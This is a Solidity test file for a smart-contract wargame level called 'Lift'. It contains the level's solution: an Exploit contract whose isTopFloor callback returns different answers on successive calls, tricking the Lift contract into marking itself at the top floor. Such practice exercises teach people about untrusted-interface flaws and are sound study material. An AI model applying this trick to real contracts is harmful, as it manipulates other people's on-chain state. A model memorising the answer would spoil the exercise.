// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        Exploit exploit = new Exploit();
        exploit.goToFloor(instance);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}

contract Exploit is House {
    uint256 isTop = 0;

    function goToFloor(Lift instance) public {
        instance.goToFloor(3);
    }

    function isTopFloor(uint256) external returns (bool){
        return (isTop++) % 2 == 1;
    }
}